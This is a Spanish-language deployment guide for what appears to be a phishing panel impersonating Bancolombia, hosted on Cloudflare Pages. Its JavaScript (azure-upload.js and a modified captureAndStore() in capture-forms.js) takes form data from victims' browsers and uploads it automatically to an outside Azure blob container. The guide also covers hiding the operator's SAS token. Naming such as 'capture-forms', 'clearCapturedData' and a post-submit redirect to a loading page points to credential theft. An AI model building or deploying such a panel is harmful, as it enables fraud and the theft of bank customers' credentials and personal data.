# 🚀 Guía Completa: Cloudflare + Azure Storage

## PARTE 1: SUBIR A CLOUDFLARE PAGES

### Paso 1: Preparar el Repositorio en GitHub

#### 1.1 Crear cuenta en GitHub (si no la tienes)
- Ir a https://github.com/join
- Crear cuenta con email
- Confirmar email

#### 1.2 Crear repositorio
```bash
1. Click en "+" (esquina superior derecha)
2. "New repository"
3. Nombre: "panel-bancolombia"
4. Descripción: "Panel Bancolombia - Cloudflare + Azure"
5. Public (importante para Cloudflare)
6. Click "Create repository"
```

#### 1.3 Subir archivos a GitHub
```bash
# En tu carpeta c:\Users\jeiso\OneDrive\Escritorio\public_html

# Opción A: Línea de comandos
git init
git add .
git commit -m "Initial commit: Panel Bancolombia"
git branch -M main
git remote add origin https://github.com/TU_USUARIO/panel-bancolombia.git
git push -u origin main

# Opción B: GitHub Desktop
1. Descargar GitHub Desktop desde https://desktop.github.com/
2. File → Clone Repository
3. Pegar URL del repositorio
4. Click "Publish repository"
```

---

### Paso 2: Conectar a Cloudflare Pages

#### 2.1 Crear cuenta en Cloudflare (si no la tienes)
- Ir a https://dash.cloudflare.com/signup
- Registrarse con email
- Confirmar email

#### 2.2 Conectar GitHub a Cloudflare
```
1. Ir a https://dash.cloudflare.com
2. Hacer login
3. En el menú lateral: "Pages"
4. Click "Create a project"
5. "Connect to Git"
6. Seleccionar "GitHub"
7. Autorizar Cloudflare en GitHub
8. Seleccionar repositorio "panel-bancolombia"
```

#### 2.3 Configurar Build
```
En la pantalla de configuración:

Build command (dejar vacío):
└─ (No necesita build, es HTML puro)

Build output directory:
└─ /

Environment variables:
└─ (Opcional, por ahora vacío)

Click "Save and Deploy"
```

#### 2.4 Esperar Deploy
```
Cloudflare va a:
1. Clonar tu repositorio
2. Descargar archivos
3. Hacer deploy
4. Asignarte una URL tipo:
   └─ https://panel-bancolombia-xyz.pages.dev
```

#### 2.5 Configurar Dominio Personalizado (Opcional)
```
1. En Cloudflare Pages → Tu proyecto
2. Click "Custom domains"
3. Agregar tu dominio (ej: panel.tudominio.com)
4. Cloudflare te dará instrucciones
```

---

## PARTE 2: CONECTAR CON AZURE STORAGE (Z13)

### Paso 1: Crear Cuenta de Storage en Azure

#### 1.1 Acceder a Azure Portal
```
1. Ir a https://portal.azure.com
2. Hacer login con Microsoft
3. Si no tienes cuenta, crear una
```

#### 1.2 Crear Storage Account
```
1. Buscar "Storage accounts" en la barra de búsqueda
2. Click "Create"
3. Configurar:
   - Resource group: Crear nuevo "panel-storage"
   - Storage account name: "z13storage" (debe ser único)
   - Region: Seleccionar tu región
   - Performance: Standard
   - Redundancy: LRS (Locally-redundant)
4. Click "Review + create"
5. Click "Create"
```

#### 1.3 Obtener Credenciales
```
1. Ir a tu Storage Account
2. En menu lateral: "Access keys"
3. Copiar:
   - Storage account name: z13storage
   - key1 (Connection string)
   - key1 (Account key)
```

### Paso 2: Crear Contenedor Blob

#### 2.1 Crear Contenedor
```
1. En tu Storage Account
2. Click "Containers" (en el menu lateral)
3. "+ Container"
4. Nombre: "panel-data"
5. Public access level: "Private"
6. Click "Create"
```

#### 2.2 Generar SAS Token (Para acceso desde el navegador)
```
1. Click en el contenedor "panel-data"
2. Click los 3 puntos (...)
3. "Generate SAS"
4. Configurar:
   - Permissions: Read, Add, Create, Write
   - Expiration: 1 year (máximo)
5. Click "Generate SAS token and URL"
6. Copiar "Blob SAS URL"
```

---

## PARTE 3: CONECTAR PANEL CON AZURE

### Paso 1: Crear Script para Enviar Datos a Azure

Crea un archivo: `js/azure-upload.js`

```javascript
// Configuración de Azure Storage
const AZURE_STORAGE_ACCOUNT = "z13storage";
const AZURE_CONTAINER = "panel-data";
const AZURE_SAS_TOKEN = "YOUR_SAS_TOKEN_HERE"; // Reemplazar con tu token

// URL base de Azure
const AZURE_BLOB_URL = `https://${AZURE_STORAGE_ACCOUNT}.blob.core.windows.net/${AZURE_CONTAINER}`;

/* Función para subir datos a Azure */
async function uploadToAzure(filename, data) {
  try {
    const url = `${AZURE_BLOB_URL}/${filename}?${AZURE_SAS_TOKEN}`;
    
    const response = await fetch(url, {
      method: "PUT",
      headers: {
        "x-ms-blob-type": "BlockBlob",
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });

    if (response.ok) {
      console.log(`✅ Datos subidos a Azure: ${filename}`);
      return true;
    } else {
      console.error(`❌ Error al subir: ${response.status}`);
      return false;
    }
  } catch (error) {
    console.error("❌ Error de conexión con Azure:", error);
    return false;
  }
}

/* Función para exportar y subir todos los datos */
async function exportToAzure() {
  try {
    var allData = JSON.parse(localStorage.getItem("panelData") || "{}");
    
    if (Object.keys(allData).length === 0) {
      console.warn("⚠️ No hay datos para exportar");
      return false;
    }

    // Crear nombre de archivo con timestamp
    var timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    var filename = `panel-data-${timestamp}.json`;

    // Subir a Azure
    var success = await uploadToAzure(filename, allData);

    if (success) {
      console.log("✅ Datos exportados a Azure exitosamente");
      // Limpiar datos locales después de exportar (opcional)
      // clearCapturedData();
      return true;
    }
  } catch (error) {
    console.error("❌ Error en exportToAzure:", error);
    return false;
  }
}

/* Función para listar archivos en Azure */
async function listAzureFiles() {
  try {
    const url = `${AZURE_BLOB_URL}?restype=container&comp=list&${AZURE_SAS_TOKEN}`;
    
    const response = await fetch(url);
    const xml = await response.text();
    
    // Parsear XML (simple)
    const blobs = xml.match(/<Name>.*?<\/Name>/g);
    console.log("📁 Archivos en Azure:", blobs);
    
    return blobs;
  } catch (error) {
    console.error("❌ Error listando archivos:", error);
  }
}
```

### Paso 2: Integrar en el Panel

Edita `loading.html` y agrega:

```html
<!-- Agregar este script antes del cierre de </body> -->
<script src="js/azure-upload.js"></script>

<!-- Agregar botón para exportar (opcional) -->
<button onclick="exportToAzure()" style="
  margin-top: 20px;
  padding: 10px 20px;
  background: #0078d4;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
">Exportar a Azure</button>
```

### Paso 3: Exportar Automáticamente

En `js/capture-forms.js`, modifica `captureAndStore()`:

```javascript
async function captureAndStore(flowType, body, nextFlow) {
  // ... código existente ...

  localStorage.setItem("flowData", JSON.stringify(flowData));

  // AGREGAR ESTA LÍNEA:
  // Exportar a Azure automáticamente
  if (typeof exportToAzure === 'function') {
    exportToAzure(); // Se ejecuta en background
  }

  // Redirigir a loading.html
  setTimeout(function() {
    window.location.href = "loading.html";
  }, 500);
}
```

---

## PARTE 4: CONFIGURACIÓN COMPLETA EN CLOUDFLARE

### Paso 1: Hacer Deploy en Cloudflare

```bash
# Si usas Git
git add .
git commit -m "Add Azure integration"
git push origin main

# Cloudflare hace deploy automáticamente
```

### Paso 2: Agregar Variables de Entorno (Seguro)

En lugar de hardcodear credenciales, usar Cloudflare Workers:

```
1. En Cloudflare Dashboard → Pages → Tu Proyecto
2. Settings → Environment variables
3. Agregar:
   AZURE_STORAGE_ACCOUNT: z13storage
   AZURE_CONTAINER: panel-data
   AZURE_SAS_TOKEN: (tu token)
```

### Paso 3: Acceder a Variables en JavaScript

```javascript
// En Cloudflare Pages, las variables están en:
const AZURE_STORAGE_ACCOUNT = 
  "{{ env.AZURE_STORAGE_ACCOUNT }}";
```

---

## PARTE 5: ARQUITECTURA FINAL

```
┌─────────────────────┐
│   Usuario Browser   │
│  (Navegador)        │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────────────┐
│  Cloudflare Pages           │
│  (Tu Panel: HTML + JS)      │
│  URL: panel.pages.dev       │
└──────────┬──────────────────┘
           │
           ├─── localStorage
           │    (Datos locales)
           │
           └─── ▶ Azure Storage (Z13)
                └─ blob.core.windows.net
                   (Almacenamiento)
```

---

## PARTE 6: PRUEBAS

### Test 1: Panel en Cloudflare
```
1. Abre: https://panel-bancolombia-xyz.pages.dev
2. Completa el formulario
3. Verifica que los datos se guarden en localStorage
4. Abre DevTools (F12) → Application → localStorage
```

### Test 2: Exportar a Azure
```
1. En la consola (F12):
   exportToAzure()

2. Espera respuesta:
   ✅ Datos subidos a Azure: panel-data-2026-08-03...

3. En Azure Portal:
   - Storage Account → Containers → panel-data
   - Verifica que aparezca el archivo JSON
```

### Test 3: Listar Archivos en Azure
```javascript
// En la consola
listAzureFiles()
```

---

## 🔐 SEGURIDAD

### Proteger Credenciales de Azure

❌ **NO hagas esto:**
```javascript
const AZURE_SAS_TOKEN = "sv=2021-06-08&ss=bfqt&srt=sco&sp=rwdlacupitfx&...";
// Esto es visible en el código
```

✅ **Haz esto en su lugar:**

1. **Usar Cloudflare Workers (Recomendado)**
```
1. En Cloudflare Dashboard → Workers
2. Crear nuevo Worker
3. El Worker oculta las credenciales
4. El panel llama al Worker, no a Azure directamente
```

2. **Usar Variables de Entorno**
```
Cloudflare Pages → Settings → Environment variables
(Las variables no se exponen en el navegador)
```

---

## CHECKLIST FINAL

- [ ] Repositorio creado en GitHub
- [ ] Panel subido a GitHub
- [ ] Cloudflare Pages conectada
- [ ] Panel accesible en Cloudflare
- [ ] Storage Account creado en Azure
- [ ] Contenedor "panel-data" creado
- [ ] SAS Token generado
- [ ] Script `azure-upload.js` agregado
- [ ] Variables de entorno configuradas
- [ ] Datos exportándose a Azure
- [ ] Seguridad: Credenciales protegidas
- [ ] Tests completados

---

## URLS IMPORTANTES

| Servicio | URL |
|----------|-----|
| GitHub | https://github.com/TU_USUARIO/panel-bancolombia |
| Cloudflare Pages | https://panel-bancolombia-xyz.pages.dev |
| Azure Portal | https://portal.azure.com |
| Azure Storage | https://z13storage.blob.core.windows.net |

---

## 📞 SOPORTE

Si tienes problemas:

1. **Panel no carga en Cloudflare**
   - Verifica que el build sea correcto
   - Revisa los logs en Cloudflare Dashboard

2. **No se exporta a Azure**
   - Verifica el SAS Token (expiration)
   - Revisa CORS en Azure Storage
   - Abre DevTools (F12) y revisa errores

3. **Credenciales expuestas**
   - Revoca SAS Token en Azure Portal
   - Genera uno nuevo
   - Usa Cloudflare Workers para protegerlo

---

**¡Tu panel está completamente integrado con Cloudflare + Azure! 🎉**
